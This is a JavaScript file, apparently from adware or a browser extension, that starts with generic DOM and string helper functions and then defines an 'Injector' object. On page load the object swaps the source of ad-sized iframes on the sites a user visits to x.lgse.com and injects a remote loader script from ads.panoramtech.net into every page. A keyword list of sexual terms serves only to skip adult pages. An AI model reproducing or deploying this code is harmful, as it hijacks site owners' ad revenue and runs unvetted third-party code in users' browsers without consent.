// Element & String Prototypes
Element.prototype.getAllElements = function (tags) {
    var collection = [];
    tags = tags.split(',');
    for(var i = 0;i < tags.length;i++) {
        var elements = this.getElementsByTagName(tags[i]);
        for(var j = 0;j < elements.length;j++) {
            collection.push(elements[j]);
        }
    }
    return collection
};
Element.prototype.getHeight = function () {
    return parseInt(this.offsetHeight);
}
Element.prototype.getWidth = function () {
    return parseInt(this.offsetWidth);
}
String.prototype.contains = function(str,startIndex) {
    return this.indexOf(str,startIndex) > -1;
}

// inArray Function
function inArray(a,obj) {
    for (var i = 0; i < a.length; i++) {
        if (a[i] === obj) {
            return true;
        }
    }
    return false;
}

// Injector
var Injector = {
    black_word_list: ['xxx','sex','cum','porn','anal','bsdm','busty','fucking','slut','whore','cock','pussy','vagina','cunt','fucked'],
    elements: [],
    inject: false,
    widths: [88,94,120,125,160,180,230,234,240,250,300,320,336,390,460,468,500,550,720,728],
    heights: [15,30,31,33,60,90,125,150,160,210,240,250,280,300,350,400,460,480,600],
    protocol: null,

    init: function () {
        // Set protocol
        this.protocol = (location.href.contains('https')) ? "https" : "http";

        // Ad Client
        this.adClient();

        // Revjet.io
        this.revjet();
    },

    adClient: function () {
        var self = this;
        if (window.top.location === window.location && this.g2g() && this.inject) {
            document.body.getAllElements('iframe').forEach(function (e) {
                var w = parseInt(e.width),
                    h = parseInt(e.height);
                if (inArray(self.widths,w) && inArray(self.heights,h)) {
                    e.src = self.protocol + "://x.lgse.com";
                }
            });
        }
    },

    g2g: function () {
        var result = true,
            html = document.body.innerHTML;
        this.black_word_list.forEach(function (word) {
            if (location.href.contains(word) || html.contains(" " + word + " ")) {
                result = false;
            }
        });

        return result;
    },

    revjet: function () {
        var s = document.createElement('script');
        s.type = "text/javascript";
        s.src = this.protocol + "://ads.panoramtech.net/loader.js?client=pm0730";
        document.getElementsByTagName('head')[0].appendChild(s);
    }
}
window.onload = Injector.init.bind(Injector);